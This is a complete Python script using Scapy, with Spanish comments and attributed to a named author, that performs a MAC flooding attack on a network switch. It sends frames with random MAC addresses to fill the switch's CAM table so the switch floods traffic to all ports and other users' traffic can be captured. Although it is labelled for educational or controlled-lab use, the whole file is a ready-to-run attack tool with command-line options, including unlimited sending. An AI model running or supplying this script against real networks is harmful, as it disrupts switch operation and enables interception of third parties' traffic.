#!/usr/bin/env python3
"""
=============================================================
  MAC Flooding Attack Script
  Protocolo: Ethernet - Layer 2
  Herramienta: Scapy
  Autor: Rey Marte - 2025-0684
  Uso educativo / laboratorio controlado
=============================================================

DESCRIPCIÓN:
  Genera frames Ethernet con MACs de origen aleatorias para
  agotar la tabla CAM (Content Addressable Memory) del switch.
  Cuando la tabla CAM se llena, el switch actúa como un hub
  y hace flooding de todos los frames a todos los puertos,
  permitiendo capturar tráfico ajeno (sniffing).

REQUISITOS:
  - Python 3.x
  - Scapy: pip install scapy
  - Ejecutar como root: sudo python3 mac_flooding.py -i eth0

USO:
  sudo python3 mac_flooding.py -i <interfaz> [-c <cantidad>] [-d <delay>]

EJEMPLOS:
  sudo python3 mac_flooding.py -i ens3
  sudo python3 mac_flooding.py -i ens3 -c 5000 -d 0.001
  sudo python3 mac_flooding.py -i ens3 -c 0          # infinito

PARÁMETROS:
  -i  Interfaz de red a usar (ej: ens3, eth0)
  -c  Cantidad de paquetes a enviar (0 = infinito, default: 1000)
  -d  Delay en segundos entre paquetes (default: 0.001)
  -v  Modo verbose (muestra cada paquete enviado)
"""

import argparse
import sys
import time
import random
import signal
from scapy.all import Ether, sendp, conf


# ──────────────────────────────────────────────
#  Variables globales
# ──────────────────────────────────────────────
sent_count = 0
start_time = None


# ──────────────────────────────────────────────
#  Utilidades
# ──────────────────────────────────────────────
def random_mac():
    """Genera una MAC aleatoria con bit unicast."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )


# ──────────────────────────────────────────────
#  Manejo de interrupción Ctrl+C
# ──────────────────────────────────────────────
def signal_handler(sig, frame):
    elapsed = time.time() - start_time
    print(f"\n\n[!] Ataque interrumpido por el usuario.")
    print(f"[*] Frames enviados     : {sent_count}")
    print(f"[*] Tiempo transcurrido : {elapsed:.2f}s")
    print(f"[*] Tasa promedio       : {sent_count/elapsed:.1f} frames/s")
    sys.exit(0)


# ──────────────────────────────────────────────
#  Construcción del frame
# ──────────────────────────────────────────────
def build_frame():
    """
    Construye un frame Ethernet con MAC src y dst aleatorias.
    El switch aprende la MAC src y la agrega a su tabla CAM.
    """
    src_mac = random_mac()
    dst_mac = random_mac()
    # Payload aleatorio para simular tráfico real
    payload = bytes(random.randint(0, 255) for _ in range(random.randint(20, 100)))
    return Ether(src=src_mac, dst=dst_mac) / payload


# ──────────────────────────────────────────────
#  Ataque principal
# ──────────────────────────────────────────────
def mac_flood(iface, count, delay, verbose):
    global sent_count, start_time

    print("=" * 60)
    print("  MAC Flooding Attack - Herramienta de Laboratorio")
    print("=" * 60)
    print(f"  Interfaz : {iface}")
    print(f"  Frames   : {count if count > 0 else 'infinito'}")
    print(f"  Delay    : {delay}s")
    print(f"  Verbose  : {'Sí' if verbose else 'No'}")
    print("=" * 60)
    print("[*] Iniciando ataque... Ctrl+C para detener.\n")
    print("[!] OBJETIVO: Llenar la tabla CAM del switch")
    print("[!] EFECTO  : El switch actuará como hub (flooding)\n")

    conf.verb = 0
    start_time = time.time()
    signal.signal(signal.SIGINT, signal_handler)

    i = 0
    while count == 0 or i < count:
        frame = build_frame()

        try:
            sendp(frame, iface=iface, verbose=False)
            sent_count += 1
            i += 1
        except Exception as e:
            print(f"[!] Error al enviar frame: {e}")
            break

        if verbose:
            print(f"[+] Frame #{sent_count:05d} | "
                  f"src: {frame.src} | "
                  f"dst: {frame.dst}")
        elif sent_count % 200 == 0:
            elapsed = time.time() - start_time
            rate = sent_count / elapsed if elapsed > 0 else 0
            print(f"\r[*] Enviados: {sent_count} frames | {rate:.0f} frames/s", end="", flush=True)

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start_time
    print(f"\n\n[✓] Ataque completado.")
    print(f"[*] Total enviados   : {sent_count}")
    print(f"[*] Tiempo total     : {elapsed:.2f}s")
    print(f"[*] Tasa promedio    : {sent_count/elapsed:.1f} frames/s")
    print(f"\n[!] Verifica en el switch: show mac address-table count")


# ──────────────────────────────────────────────
#  Punto de entrada
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="MAC Flooding Attack Script - Uso en laboratorio controlado",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 mac_flooding.py -i ens3
  sudo python3 mac_flooding.py -i ens3 -c 5000 -d 0.001
  sudo python3 mac_flooding.py -i ens3 -c 0              # infinito
        """
    )
    parser.add_argument("-i", "--iface",   required=True, help="Interfaz de red (ej: ens3)")
    parser.add_argument("-c", "--count",   type=int, default=1000, help="Frames a enviar (0 = infinito, default: 1000)")
    parser.add_argument("-d", "--delay",   type=float, default=0.001, help="Delay entre frames en segundos (default: 0.001)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar detalles de cada frame")

    args = parser.parse_args()

    import os
    if os.geteuid() != 0:
        print("[!] Este script requiere privilegios de root.")
        print("    Ejecuta: sudo python3 mac_flooding.py ...")
        sys.exit(1)

    mac_flood(args.iface, args.count, args.delay, args.verbose)


if __name__ == "__main__":
    main()
